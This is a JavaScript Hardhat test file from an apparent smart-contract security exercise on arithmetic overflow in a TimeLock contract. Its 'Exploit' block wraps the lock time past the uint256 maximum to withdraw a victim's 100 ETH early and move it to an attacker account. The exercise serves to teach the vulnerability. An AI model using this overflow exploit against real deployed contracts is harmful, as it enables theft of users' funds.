const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Arithmetic Over/Underflow Exercise 1', function () {

    let deployer, victim, attacker;
    const ONE_MONTH = 30 * 24 * 60 * 60;
    const VICTIM_DEPOSIT = ethers.utils.parseEther("100")

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, victim, attacker] = await ethers.getSigners();
        this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address)
        this.victimInitialBalance = await ethers.provider.getBalance(victim.address)

        const TimeLockFactory = await ethers.getContractFactory(
            'contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock', 
            deployer
        );
        // const TimeLockFactory = await ethers.getContractFactory(
        //     'contracts/arithmetic-overflows-1/solution/TimeLockSecured.sol:TimeLockSecured', 
        //     deployer
        // );
        this.timelock = await TimeLockFactory.deploy();
        
        await this.timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
        let currentBalance = await ethers.provider.getBalance(victim.address);
        expect(currentBalance).to.be.lt(this.victimInitialBalance.sub(VICTIM_DEPOSIT))

        let block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
        let blockTimestmap = block.timestamp;

        let victimDeposited = await this.timelock.connect(victim).getBalance(victim.address);
        let lockTime = await this.timelock.connect(victim).getLocktime(victim.address);

        expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        let currentLockTime = await this.timelock.getLocktime(victim.address);
        let timeToAdd = ethers.constants.MaxUint256.add(1).sub(currentLockTime)
        await this.timelock.connect(victim).increaseMyLockTime(timeToAdd);
        await this.timelock.connect(victim).withdrawETH();
        await victim.sendTransaction({
            to: attacker.address,
            value: VICTIM_DEPOSIT
        });
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
        let victimDepositedAfter = await this.timelock.connect(victim).getBalance(victim.address);
        expect(victimDepositedAfter).to.equal(0);

        // Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
        let attackerCurrentBalance = await ethers.provider.getBalance(attacker.address);
        expect(attackerCurrentBalance).to.be.gt(
            this.attackerInitialBalance.add(VICTIM_DEPOSIT).sub(ethers.utils.parseEther("0.2"))
        );
    });
});
